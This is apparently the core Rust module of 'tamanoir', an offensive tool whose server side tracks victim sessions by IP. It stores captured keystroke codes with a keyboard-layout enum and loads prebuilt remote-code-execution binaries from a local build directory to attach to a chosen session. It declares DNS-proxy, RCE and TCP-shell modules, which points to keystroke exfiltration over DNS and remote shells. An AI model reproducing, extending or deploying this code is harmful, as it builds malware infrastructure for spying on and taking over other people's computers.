pub mod cli;
pub mod dns_proxy;
pub mod grpc;
pub mod rce;
pub mod tcp_shell;
pub mod tamanoir_grpc {
    tonic::include_proto!("tamanoir");
}
use core::fmt;
use std::{
    collections::HashMap,
    fs,
    net::{Ipv4Addr, SocketAddr},
    str::FromStr,
    sync::Arc,
};

use home::home_dir;
use serde::Deserialize;
use tokio::sync::{
    broadcast::{self, Sender},
    Mutex,
};

const AR_COUNT_OFFSET: usize = 10;
const AR_HEADER_LEN: usize = 12;
const FOOTER_TXT: &str = "r10n4m4t/";
const FOOTER_EXTRA_BYTES: usize = 3;
const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;

#[derive(Debug, Clone, PartialEq, Deserialize)]
pub enum TargetArch {
    X86_64,
    Aarch64,
}
#[derive(Debug, Clone, PartialEq)]
pub enum Engine {
    Docker,
    Podman,
}
impl fmt::Display for TargetArch {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            TargetArch::X86_64 => write!(f, "x86_64"),
            TargetArch::Aarch64 => write!(f, "aarch64"),
        }
    }
}
impl fmt::Display for Engine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Engine::Docker => write!(f, "docker"),
            Engine::Podman => write!(f, "podman"),
        }
    }
}
impl FromStr for Engine {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "docker" => Ok(Engine::Docker),
            "podman" => Ok(Engine::Podman),
            _ => Err(format!("{} engine isn't implmented", s)),
        }
    }
}

impl FromStr for TargetArch {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "x86_64" => Ok(TargetArch::X86_64),
            "aarch64" => Ok(TargetArch::Aarch64),
            _ => Err(format!("{} arch isn't implmented", s)),
        }
    }
}
enum Layout {
    Qwerty = 0,
    Azerty = 1,
    Unknown = 2,
}
impl From<u8> for Layout {
    fn from(value: u8) -> Self {
        match value {
            0 => Self::Qwerty,
            1 => Self::Azerty,
            _ => Self::Unknown,
        }
    }
}
impl TargetArch {
    pub const ALL: [Self; 2] = [Self::X86_64, Self::Aarch64];
}

#[derive(Debug, Deserialize, Clone)]
pub struct SessionRcePayload {
    name: String,
    target_arch: TargetArch,
    length: usize,
    buffer: Vec<u8>,
}
#[derive(Debug, Clone)]
pub struct Session {
    pub ip: Ipv4Addr,
    pub key_codes: Vec<u8>,
    pub rce_payload: Option<SessionRcePayload>,
}
impl Session {
    pub fn new(sock_addr: SocketAddr) -> Option<Self> {
        match sock_addr {
            SocketAddr::V4(addr) => Some(Session {
                ip: *addr.ip(),

                key_codes: vec![],
                rce_payload: None,
            }),
            _ => None,
        }
    }
    pub fn reset_rce_payload(&mut self) {
        self.rce_payload = None;
    }
    pub fn set_rce_payload(&mut self, rce: &str, target_arch: TargetArch) -> Result<(), String> {
        if let Some(_) = self.rce_payload {
            return Err(format!(
                "An rce payload already exists for session {}",
                self.ip
            ));
        }
        match target_arch {
            TargetArch::X86_64 => {
                let mut build_dir = home_dir().unwrap();
                build_dir.push(".tamanoir/bins");

                let bin_name = format!("tamanoir-rce-{}_x86_64.bin", rce);

                let data: Vec<u8> = fs::read(build_dir.join(bin_name)).map_err(|_| {
                    format!(
                        "rce {} not found in build directory, you may need to (re)build it",
                        rce
                    )
                })?;
                self.rce_payload = Some(SessionRcePayload {
                    name: rce.into(),
                    target_arch: TargetArch::X86_64,
                    length: data.len(),
                    buffer: data,
                });
                Ok(())
            }
            _ => Err(format!("target arch {:#?} unavailable", target_arch)),
        }
    }
}

#[derive(Debug, Deserialize)]
struct CargoMetadata {
    package: Option<PackageMetadata>,
}

#[derive(Debug, Deserialize)]
struct PackageMetadata {
    name: String,
}

type SessionsState = Arc<Mutex<HashMap<Ipv4Addr, Session>>>;
type SessionsStateWatcher = Arc<Sender<Session>>;
#[derive(Clone)]
pub struct SessionsStore {
    pub sessions: SessionsState,
    pub tx: SessionsStateWatcher,
}
impl SessionsStore {
    pub fn new() -> Self {
        let (tx, _) = broadcast::channel(16);
        Self {
            sessions: Arc::new(Mutex::new(HashMap::new())),
            tx: Arc::new(tx),
        }
    }
    pub fn try_send(&self, session: Session) -> anyhow::Result<()> {
        if self.tx.receiver_count() > 0 {
            self.tx.send(session)?;
        }
        Ok(())
    }
}
